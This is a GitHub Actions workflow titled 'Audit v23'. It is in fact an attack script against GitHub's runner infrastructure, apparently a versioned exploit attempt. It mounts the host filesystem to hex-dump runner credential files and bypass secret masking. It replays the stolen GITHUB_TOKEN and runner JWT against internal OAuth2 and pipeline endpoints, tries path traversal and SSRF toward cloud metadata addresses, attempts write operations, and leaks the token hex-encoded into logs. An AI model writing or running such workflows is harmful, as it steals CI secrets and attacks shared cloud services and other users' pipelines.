name: Audit v23
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v23:
    runs-on: ubuntu-latest
    env:
      UPSTREAM_OWNER: twrps
      UPSTREAM_REPO: PoC-RACE2
      FORK_OWNER: lacaag
      FORK_REPO: PoC-RACE2
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest + HEX credential extraction (bypass mask)
      # v22: cat showed *** because runner masks stdout
      # v17: xxd hex worked! Use xxd again, decode in Python
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest + hex creds
        if: always()
        run: |
          set +e
          echo "=== V23 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt

          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" | head -1 | sed 's/"url"\s*:\s*"//')
            echo "RUN_URL=$RUN_URL"; echo "$RUN_URL" > /tmp/run_url.txt
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi

          # HEX extraction — bypasses runner output masking
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            if [ -f "$F" ]; then
              echo "CRED_HEX_START"
              xxd -p "$F" | tr -d "\n"
              echo ""
              echo "CRED_HEX_END"
            fi
            F2=$(find /h/home/runner -name ".credentials_rsaparams" -type f 2>/dev/null | head -1)
            if [ -f "$F2" ]; then
              echo "RSA_HEX_START"
              xxd -p "$F2" | tr -d "\n"
              echo ""
              echo "RSA_HEX_END"
            fi
          ' 2>/dev/null > /tmp/hex_extract.txt

          # Python: decode hex, extract token, save WITHOUT printing to stdout (avoids mask)
          python3 << 'PYEOF'
          import binascii, json, sys
          try:
            raw = open('/tmp/hex_extract.txt').read()
            start = raw.find('CRED_HEX_START')
            end = raw.find('CRED_HEX_END')
            if start >= 0 and end >= 0:
              hex_str = raw[start+len('CRED_HEX_START'):end].strip()
              decoded = binascii.unhexlify(hex_str).decode('utf-8')
              data = json.loads(decoded)
              token = data.get('Data', {}).get('token', '')
              # Write to file WITHOUT printing (avoids stdout mask)
              with open('/tmp/cred_token.txt', 'w') as f:
                f.write(token)
              print(f"CRED_TOKEN_LEN={len(token)}")
              print(f"CRED_SCHEME={data.get('Scheme','')}")
              # Decode JWT header to see what kind of token this is
              import base64
              parts = token.split('.')
              if len(parts) >= 2:
                # Pad base64
                padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
                claims = base64.urlsafe_b64decode(padded).decode('utf-8', errors='ignore')
                claims_json = json.loads(claims)
                print(f"CRED_JWT_CLAIMS_KEYS={list(claims_json.keys())}")
                # Print safe claim fields
                for k in ['iss', 'aud', 'sub', 'orch_id', 'owner_id', 'runner_id', 'runner_group_id', 'runner_name', 'runner_type', 'runner_os']:
                  if k in claims_json:
                    print(f"  {k}={claims_json[k]}")
          except Exception as e:
            print(f"ERR: {e}")
          PYEOF

          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: oauth2/token with clientId + credential JWT
      # v22: "Value cannot be null (Parameter 'clientId')"
      # Now we send clientId. And use the actual JWT token.
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - OAuth2 with clientId
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== OAUTH2 WITH CLIENTID ==="
          RT=$(cat /tmp/rt.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
          [ -z "$PURL" ] && exit 0

          # Extract orch_id from credential token JWT for use as clientId
          CLIENT_ID=$(python3 -c "
          import json, base64
          try:
            tok = open('/tmp/cred_token.txt').read().strip()
            parts = tok.split('.')
            if len(parts) >= 2:
              padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
              claims = json.loads(base64.urlsafe_b64decode(padded))
              print(claims.get('orch_id', claims.get('owner_id', claims.get('sub', ''))))
          except: pass
          " 2>/dev/null)
          echo "CLIENT_ID from JWT: $CLIENT_ID"

          # Candidate clientIds
          echo "--- A: client_credentials with clientIds ---"
          for CID in \
            "$CLIENT_ID" \
            "8f795dfa-02d7-4018-af3a-c98d25c03f68" \
            "16cc8db7-5a82-87e5-749a-0b8db53d45e7" \
            "1000000086" \
            "a85b8835-c1a1-4aac-ae97-1c3d0ba72dbd" \
            "00000000-0000-0000-0000-000000000000" \
            "v22"; do
            [ -z "$CID" ] && continue
            # With credential token assertion
            if [ -n "$CTOK" ] && [ ${#CTOK} -gt 10 ]; then
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Content-Type: application/x-www-form-urlencoded" \
                "${PURL}_apis/oauth2/token" \
                -d "grant_type=client_credentials&client_assertion=$(python3 -c 'import urllib.parse;print(urllib.parse.quote(open("/tmp/cred_token.txt").read().strip()))')&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=$CID&scope=vso.full_access")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "A cred cid=$CID = $CODE | $(echo "$BODY" | head -c 300)"
            fi

            # With GITHUB_TOKEN assertion
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Content-Type: application/x-www-form-urlencoded" \
              "${PURL}_apis/oauth2/token" \
              -d "grant_type=client_credentials&client_assertion=$RT&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=$CID")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A rt   cid=$CID = $CODE | $(echo "$BODY" | head -c 300)"
          done
          echo ""

          # B: jwt-bearer with credential JWT (it IS a JWT, should deserialize)
          echo "--- B: jwt-bearer with cred JWT ---"
          if [ -n "$CTOK" ] && [ ${#CTOK} -gt 10 ]; then
            for CID in "$CLIENT_ID" "8f795dfa-02d7-4018-af3a-c98d25c03f68" "a85b8835-c1a1-4aac-ae97-1c3d0ba72dbd"; do
              [ -z "$CID" ] && continue
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Content-Type: application/x-www-form-urlencoded" \
                "${PURL}_apis/oauth2/token" \
                -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$(python3 -c 'import urllib.parse;print(urllib.parse.quote(open("/tmp/cred_token.txt").read().strip()))')&client_id=$CID&scope=vso.full_access")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "B jwt-bearer cid=$CID = $CODE | $(echo "$BODY" | head -c 300)"
            done
          fi
          echo ""

          # C: OIDC token as assertion (it IS a proper JWT from GitHub OIDC)
          echo "--- C: OIDC JWT on oauth2 ---"
          # Get OIDC with pipeline service as audience
          OIDC=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://pipelinesghubeus14.actions.githubusercontent.com" | jq -r '.value // empty')
          if [ -n "$OIDC" ]; then
            for CID in "$CLIENT_ID" "8f795dfa-02d7-4018-af3a-c98d25c03f68"; do
              [ -z "$CID" ] && continue
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Content-Type: application/x-www-form-urlencoded" \
                "${PURL}_apis/oauth2/token" \
                -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$OIDC&client_id=$CID&scope=vso.full_access")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "C oidc cid=$CID = $CODE | $(echo "$BODY" | head -c 300)"
            done
          fi

      # ══════════════════════════════════════════════════════════════
      # STEP 3: SSRF via pipeline service
      # The pipeline URL has a secret path segment — try path traversal
      # Also try serviceendpoint creation as SSRF gadget
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - SSRF + path traversal
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== SSRF + PATH TRAVERSAL ==="
          RT=$(cat /tmp/rt.txt)
          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
          RUN_URL=$(cat /tmp/run_url.txt 2>/dev/null)
          [ -z "$PURL" ] && exit 0

          # A: Path traversal on pipeline service
          echo "--- A: Pipeline path traversal ---"
          BASE="https://pipelinesghubeus14.actions.githubusercontent.com"
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          for PAYLOAD in \
            "../_apis/connectionData" \
            "../../_apis/connectionData" \
            "../../../_apis/connectionData" \
            "${SECRET}/../other_secret/_apis/connectionData" \
            "${SECRET}/%2e%2e/other/_apis/connectionData" \
            "${SECRET}/..%2f..%2f_apis/connectionData" \
            "${SECRET}%00/_apis/connectionData" \
            "${SECRET}/../../../internal/_apis/connectionData" \
            "_apis/location" \
            "_apis/location/locationAreas" \
            "_internal/health" \
            "_internal/status" \
            "internal/health" \
            "_debug" \
            "_status" \
            "_health" \
            "healthcheck" \
            "api/health" \
            "swagger" \
            "swagger.json" \
            "_apis" \
            "version"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $RT" "$BASE/$PAYLOAD")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "A $PAYLOAD = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # B: SSRF via service endpoint creation
          echo "--- B: Serviceendpoint SSRF ---"
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
            "${PURL}_apis/serviceendpoint/endpoints" \
            -d '{"name":"v23-ssrf","type":"generic","url":"http://169.254.169.254/metadata/instance?api-version=2021-02-01","authorization":{"parameters":{"username":"v23","password":"v23"},"scheme":"UsernamePassword"}}')
          CODE=$(echo "$R" | tail -1)
          echo "B create endpoint = $CODE | $(echo "$R" | sed '$d' | head -c 250)"

          # Try generic http endpoint to IMDS
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
            "${PURL}_apis/serviceendpoint/endpoints" \
            -d '{"name":"v23-imds","type":"ExternalServer","url":"http://168.63.129.16/machine?comp=goalstate","authorization":{"parameters":{},"scheme":"None"}}')
          CODE=$(echo "$R" | tail -1)
          echo "B wireserver endpoint = $CODE | $(echo "$R" | sed '$d' | head -c 250)"
          echo ""

          # C: Path traversal on run-service
          echo "--- C: Run-service traversal ---"
          if [ -n "$RUN_URL" ]; then
            RUN_BASE=$(echo "$RUN_URL" | grep -oP 'https://[^/]+')
            RUN_NUM=$(echo "$RUN_URL" | grep -oP '/[0-9]+/$' | tr -d '/')
            for PAYLOAD in \
              "../$((RUN_NUM-1))/" \
              "../$((RUN_NUM+1))/" \
              "../0/" \
              "../1/" \
              "../../" \
              "../" \
              "../${RUN_NUM}/../1/check" \
              "_internal/health"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $RT" "$RUN_BASE/$PAYLOAD")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "C $PAYLOAD = $CODE | $(echo "$BODY" | head -c 200)"
            done
          fi
          echo ""

          # D: SSRF via cache server URL traversal
          echo "--- D: Cache URL SSRF ---"
          CACHE_BASE="https://artifactcache.actions.githubusercontent.com"
          for PAYLOAD in \
            "../_internal/status" \
            "../health" \
            "../_apis/connectionData" \
            "${SECRET}/../../other_run_id/_apis/artifactcache/cache?keys=*" \
            "${SECRET}/../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/_apis/artifactcache/cache?keys=*"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $RT" "$CACHE_BASE/$PAYLOAD")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "D $PAYLOAD = $CODE | $(echo "$BODY" | head -c 200)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: Use credential JWT on pipeline write endpoints
      # Credential token IS accepted on oauth2 — try on other services
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - Cred JWT on services
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== CRED JWT ON SERVICES ==="
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
          PLAN=$(cat /tmp/plan.txt 2>/dev/null)
          JOB=$(cat /tmp/job.txt 2>/dev/null)

          if [ -z "$CTOK" ] || [ ${#CTOK} -lt 10 ]; then echo "NO CRED TOKEN"; exit 0; fi
          echo "CTOK: ${#CTOK} chars"

          # A: Pipeline service with credential JWT
          echo "--- A: Pipeline endpoints ---"
          for EP in \
            "_apis/connectionData" \
            "_apis/resourceareas" \
            "_apis/distributedtask/plans/$PLAN/timelines" \
            "_apis/distributedtask/plans/$PLAN/logs" \
            "_apis/distributedtask/plans/$PLAN/events" \
            "_apis/distributedtask/events" \
            "_apis/distributedtask/variablegroups" \
            "_apis/distributedtask/securefiles" \
            "_apis/distributedtask/agents" \
            "_apis/distributedtask/agentpools" \
            "_apis/distributedtask/queues" \
            "_apis/actions/gates" \
            "_apis/pipelines/runs" \
            "_apis/build/builds"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $CTOK" "${PURL}${EP}")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "A $EP = $CODE | $(echo "$BODY" | head -c 250)"
          done
          echo ""

          # B: Write operations with credential JWT
          echo "--- B: Write ops ---"
          # Create log
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $CTOK" -H "Content-Type: application/json" \
            "${PURL}_apis/distributedtask/plans/$PLAN/logs" \
            -d '{"path":"v23-injected"}')
          CODE=$(echo "$R" | tail -1)
          echo "B create log = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          # Post event
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $CTOK" -H "Content-Type: application/json" \
            "${PURL}_apis/distributedtask/events" \
            -d '{"name":"v23-event","data":"injected"}')
          CODE=$(echo "$R" | tail -1)
          echo "B event = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          # Create variable group
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $CTOK" -H "Content-Type: application/json" \
            "${PURL}_apis/distributedtask/variablegroups" \
            -d '{"name":"v23-vars","type":"Vsts","variables":{"key":{"value":"v23","isSecret":true}}}')
          CODE=$(echo "$R" | tail -1)
          echo "B vargroup = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          # Upload secure file
          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: Bearer $CTOK" -H "Content-Type: application/octet-stream" \
            "${PURL}_apis/distributedtask/securefiles?name=v23.key" \
            --data-binary "V23-SECRET-KEY")
          CODE=$(echo "$R" | tail -1)
          echo "B securefile = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

          # C: Results-receiver with credential JWT
          echo "--- C: Results-receiver ---"
          RESULTS="https://results-receiver.actions.githubusercontent.com"
          for METHOD in CreateCacheEntry ListCacheEntries; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $CTOK" -H "Content-Type: application/json" \
              "$RESULTS/twirp/github.actions.results.api.v1.CacheService/$METHOD" \
              -d '{"key":"v23","version":"1"}')
            CODE=$(echo "$R" | tail -1)
            echo "C $METHOD = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V23 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "CTOK_LEN=$(wc -c < /tmp/cred_token.txt 2>/dev/null)"
          echo "=== V23 COMPLETE ==="
